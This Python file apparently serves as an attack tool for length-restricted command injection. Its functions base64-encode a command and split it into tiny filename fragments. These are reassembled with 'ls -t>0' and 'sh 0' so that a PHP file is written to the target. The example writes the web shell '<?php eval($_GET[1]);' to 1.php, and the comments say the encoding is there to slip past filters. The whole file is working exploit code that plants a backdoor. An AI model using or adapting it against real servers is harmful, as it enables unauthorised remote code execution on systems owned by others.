from .base64_tools import base64_encode

def get_php_payload_7(target_php_command: str, target_php_file_name) -> list[str]:
    # 将command转换为base64格式 方便绕过
    base64_php_command = base64_encode(target_php_command)
    # 构造执行语句
    main_command = f"echo {base64_php_command}|base64 -d>{target_php_file_name}"
    # 把字符串按照长度进行切片
    n = 2
    result = [main_command[i : i + n] for i in range(0, len(main_command), n)]
    # 处理特殊字符
    for i in range(len(result)):
        result[i] = result[i].replace(" ", "\\ ")
        result[i] = result[i].replace("|", "\\|")
        result[i] = result[i].replace(">", "\\>")
    result.reverse()
    # 增加前缀和后缀
    for i in range(len(result)):
        if i == 0:
            result[i] = ">" + result[i]
        else:
            result[i] = ">" + result[i] + "\\\\"
    result.append("ls -t>0")
    result.append("sh 0")
    return result


def get_php_payload_5(target_php_command: str, target_php_file_name) -> list[str]:
    base64_php_command = base64_encode(target_php_command)
    main_command = f"echo {base64_php_command}|base64 -d>{target_php_file_name}"
    n = 2
    result = [main_command[i : i + n] for i in range(0, len(main_command), n)]
    for i in range(len(result)):
        result[i] = result[i].replace(" ", "\\ ")
        result[i] = result[i].replace("|", "\\|")
        result[i] = result[i].replace(">", "\\>")
    result.reverse()
    # 增加前缀和后缀
    for i in range(len(result)):
        if i == 0:
            result[i] = ">" + result[i]
        else:
            result[i] = ">" + result[i] + "\\\\"
    result.append("ls \\\\")
    result.append("-t>0")
    result.append("sh 0")
    return result


if __name__ == "__main__":
    print(get_php_payload_5("<?php eval($_GET[1]);", "1.php"))
